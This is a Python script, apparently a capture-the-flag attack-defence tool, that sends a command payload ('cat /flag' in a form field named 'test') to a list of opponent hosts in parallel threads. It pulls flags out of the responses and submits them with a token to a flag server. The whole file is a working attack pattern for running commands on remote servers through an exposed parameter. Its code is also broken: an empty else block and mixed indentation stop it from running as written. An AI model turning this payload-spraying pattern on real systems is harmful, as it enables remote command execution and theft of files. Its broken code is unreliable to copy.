# Author: HeliantHuS
# IDE: VIM
# System Env: Kali Linux

import requests
import re
import threading
# submit flag address
flagServer = ""

# Flag Server Token
token = ""

# Attack Main attack function 
def Attack(target: str, payload: dict):
    try:
        data = payload
        response = requests.post(target, data=data).content.decode()
        flag = re.findall("flag{.*?}", response, re.S)
        if len(flag) > 0:
        	flag = flag[0]
        	print(f"[+]{target}: {flag}")
	        SubmitFlag(target, flag)
	    else:

    except:
        pass

# SubmitFlag emm...submit flag to flagserver
def SubmitFlag(target: str, flag: str):
    # Request Header | Add Appcation Json
    headers = {
        "Content-Type": "application/json; charset=UTF-8"
    }
    
    data = {
        "flag": flag,
        "token": token
    }

    response = requests.post(flagServer, headers=headers, data=data).json()

    # Not Use File Redirect
    print(f"{target}, {response}")

    with open("result.txt", "a+") as fp:
        fp.write(f"[+]{target}, {response} \n")

# ItemDWList | is example. 
def ItemDWList(start, end, me):
    return [f"http://127.0.0.1:1{str(i).rjust(2, '0')}80" for i in range(start, end+1) if i != me]

if __name__ == "__main__":
    # target list
    dw = []
    # dw example
    # print(ItemDWList(1, 16, 1))

    payload = {
		"test": "cat /flag"
    }
    for i in dw:
       t = threading.Thread(target=Attack, args=(i, payload))
       t.start()
    t.join()
